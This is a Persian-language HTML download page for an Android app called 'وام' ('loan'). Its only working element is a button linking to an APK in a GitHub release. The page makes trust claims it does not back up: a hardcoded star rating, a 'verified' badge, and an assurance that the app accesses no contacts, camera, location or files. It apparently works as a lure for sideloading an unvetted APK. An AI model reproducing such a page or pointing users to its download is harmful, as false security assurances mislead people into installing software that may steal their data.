<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>دانلود وام</title>
<link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  html, body { height:100%; }
  body {
    font-family: 'Vazirmatn', Tahoma, sans-serif;
    background: linear-gradient(135deg, #f0f4ff 0%, #fafbff 45%, #eef6f1 100%);
    min-height:100vh;
    min-height:100dvh;
    display:flex; align-items:center; justify-content:center;
    padding:14px;
    color:#1a2238;
    position:relative;
    overscroll-behavior-y: auto;
  }
  body::before, body::after {
    content:''; position:fixed;
    width:420px; height:420px; border-radius:50%;
    filter: blur(90px); z-index:0; pointer-events:none;
  }
  body::before { background: rgba(0,200,150,0.22); top:-120px; right:-100px; }
  body::after  { background: rgba(80,140,255,0.20);  bottom:-140px; left:-120px; }

  .page {
    position:relative; z-index:1;
    width:100%; max-width:460px;
    max-height: calc(100dvh - 28px);
    overflow:hidden;
    background: rgba(255,255,255,0.78);
    border:1px solid rgba(255,255,255,0.95);
    border-radius:26px;
    padding:26px 24px 22px;
    backdrop-filter: blur(22px) saturate(160%);
    -webkit-backdrop-filter: blur(22px) saturate(160%);
    box-shadow:
      0 30px 70px -25px rgba(15,32,80,0.28),
      0 8px 22px -10px rgba(15,32,80,0.12),
      inset 0 1px 0 rgba(255,255,255,0.9);
    text-align:center;
    animation: rise 0.7s cubic-bezier(.2,.7,.2,1) both;
  }
  @keyframes rise {
    from { opacity:0; transform:translateY(20px) scale(0.98); }
    to   { opacity:1; transform:translateY(0) scale(1); }
  }

  .app-icon-wrap {
    position:relative;
    width:118px; height:118px;
    margin:0 auto 18px;
  }
  .app-icon-wrap::before {
    content:''; position:absolute; inset:-8px;
    border-radius:34px;
    background: radial-gradient(circle at 30% 25%, rgba(0,200,150,0.35), transparent 70%);
    filter: blur(16px); z-index:0;
  }
  .app-icon {
    position:relative; z-index:1;
    width:118px; height:118px;
    border-radius:28px;
    object-fit:cover; display:block;
    border:1px solid rgba(255,255,255,0.9);
    box-shadow:
      0 18px 42px -14px rgba(15,32,80,0.45),
      0 8px 18px -8px rgba(15,32,80,0.25),
      inset 0 2px 4px rgba(255,255,255,0.6);
    background:#f5f7fb;
  }

  h1 {
    font-size:24px; font-weight:800;
    color:#0b1f4d; margin-bottom:6px;
    letter-spacing:-0.3px;
    line-height:1.3;
  }
  .publisher {
    font-size:13.5px; color:#697a99;
    margin-bottom:18px; font-weight:600;
  }
  .publisher b { color:#0b1f4d; font-weight:800; }

  .stats {
    display:flex; align-items:center; justify-content:center;
    gap:10px; margin-bottom:18px;
    padding:14px 0;
    border-top:1px solid rgba(15,32,80,0.07);
    border-bottom:1px solid rgba(15,32,80,0.07);
  }
  .stat {
    text-align:center; flex:1;
    padding:5px 3px;
    border-radius:12px;
    background: rgba(255,255,255,0.55);
    border:1px solid rgba(255,255,255,0.8);
  }
  .stat strong {
    display:block; font-size:15px; font-weight:800;
    color:#0b1f4d; margin-bottom:3px;
  }
  .stat span {
    font-size:11px; color:#7c8aa6; font-weight:600;
  }

  .stars {
    display:block;
    direction: ltr;
    unicode-bidi: bidi-override;
    font-size:108px;
    letter-spacing:4px;
    margin-bottom:4px;
    line-height:0.85;
    color:#d6dbe5;
    text-align:center;
  }
  .stars .on { color:#ffb300; }

  .security {
    background: linear-gradient(160deg, rgba(255,255,255,0.9), rgba(236,250,244,0.7));
    border:1px solid rgba(0,200,150,0.28);
    border-radius:15px;
    padding:14px 16px 14px;
    margin-bottom:18px;
    text-align:right;
    box-shadow: inset 0 1px 0 rgba(255,255,255,0.95), 0 6px 18px -12px rgba(0,200,150,0.3);
  }
  .security .head {
    display:flex; align-items:center; gap:8px;
    font-size:13.5px; font-weight:800;
    color:#007a55; margin-bottom:7px;
  }
  .security .head svg { width:18px; height:18px; flex-shrink:0; }
  .security p {
    font-size:12.5px; line-height:1.9; color:#3f5a52;
    font-weight:500;
  }
  .security b { color:#007a55; font-weight:800; }

  .btn {
    display:flex; align-items:center; justify-content:center; gap:10px;
    width:100%; padding:16px 20px;
    background: linear-gradient(180deg, #00d95c 0%, #00b34a 100%);
    color:#fff; text-decoration:none;
    border-radius:15px;
    font-size:17px; font-weight:800;
    letter-spacing:0.2px;
    box-shadow:
      0 14px 30px -10px rgba(0,200,83,0.65),
      inset 0 1px 0 rgba(255,255,255,0.4),
      inset 0 -2px 0 rgba(0,0,0,0.12);
    transition: transform 0.18s ease, box-shadow 0.18s ease;
  }
  .btn:hover { transform:translateY(-2px); }
  .btn:active { transform:translateY(1px); }
  .btn svg { width:20px; height:20px; }

  .version-tag {
    text-align:center; margin-top:11px;
    font-size:12px; color:#7c8aa6; font-weight:600;
  }
  .version-tag b { color:#0b1f4d; font-weight:800; }

  .footer {
    margin-top:14px; padding-top:14px;
    border-top:1px solid rgba(15,32,80,0.07);
  }
  .footer .badge {
    display:inline-flex; align-items:center; gap:7px;
    background: linear-gradient(180deg, #ecfdf3, #dcfbe8);
    color:#00843d;
    border:1px solid rgba(0,200,83,0.35);
    padding:7px 15px; border-radius:999px;
    font-size:12.5px; font-weight:800;
    box-shadow: 0 6px 16px -8px rgba(0,200,83,0.4), inset 0 1px 0 rgba(255,255,255,0.9);
  }
  .footer .badge .dot {
    width:7px; height:7px; border-radius:50%; background:#00c853;
    box-shadow:0 0 0 4px rgba(0,200,83,0.18);
  }

  @media (max-height:640px) {
    .page { padding:20px 18px 16px; }
    .app-icon-wrap, .app-icon { width:96px; height:96px; }
    .app-icon { border-radius:22px; }
    h1 { font-size:21px; }
    .publisher { font-size:12.5px; margin-bottom:14px; }
    .stats { padding:11px 0; margin-bottom:14px; }
    .security { padding:11px 13px; margin-bottom:14px; }
    .security p { font-size:12px; }
    .btn { padding:14px 16px; font-size:16px; }
    .footer { margin-top:11px; padding-top:11px; }
  }
</style>
</head>
<body>
  <div class="page">

    <div class="app-icon-wrap">
      <img id="appIcon" class="app-icon" alt="وام">
    </div>

    <h1>وام</h1>
    <p class="publisher">ارائه‌شده توسط <b>رایان اپ</b></p>

    <div class="stats">
      <div class="stat">
        <span class="stars"><span class="on">★★★★</span>★</span>
        <span>امتیاز کاربران</span>
      </div>
      <div class="stat">
        <strong>سبک</strong>
        <span>حجم</span>
      </div>
      <div class="stat">
        <strong>1.14.3</strong>
        <span>نسخه</span>
      </div>
    </div>

    <div class="security">
      <div class="head">
        <svg viewBox="0 0 24 24" fill="none" stroke="#007a55" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
        تضمین امنیت و حریم خصوصی
      </div>
      <p>این اپلیکیشن <b>هیچ‌گونه دسترسی</b> به مخاطبین، گالری، دوربین، موقعیت مکانی یا فایل‌های گوشی شما <b>ندارد</b>. اطلاعات شما کاملاً امن باقی می‌ماند.</p>
    </div>

    <a href="https://github.com/iran98ir/app.down/releases/download/vam/app.apk" class="btn">
      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M5 21h14"/></svg>
      دانلود و نصب
    </a>

    <div class="version-tag">آخرین بروزرسانی: <b>نسخه 1.14.3</b></div>

    <div class="footer">
      <div class="badge"><span class="dot"></span> تایید شده توسط رایان اپ</div>
    </div>

  </div>

  <script>
    (function(){
      var candidates = [
        'icon.png','icon.jpeg','icon.jpg','icon.webp','icon.gif','icon.svg',
        'logo.png','logo.jpeg','logo.jpg','logo.webp','logo.svg',
        'app.png','app.jpeg','app.jpg','app-icon.png','app-icon.jpeg',
        'images.png','images.jpeg','images.jpg','images (2).png','images (2).jpeg',
        'image.png','image.jpeg','image.jpg'
      ];
      var img = document.getElementById('appIcon');
      var i = 0;
      img.onerror = function(){
        i++;
        if (i < candidates.length) {
          img.src = candidates[i];
        } else {
          img.style.display = 'none';
          img.parentNode.style.background = 'linear-gradient(135deg,#00c896,#007a55)';
          img.parentNode.style.borderRadius = '28px';
          img.parentNode.style.boxShadow = '0 18px 42px -14px rgba(0,200,150,0.5)';
        }
      };
      img.src = candidates[0];
    })();
  </script>
</body>
</html>
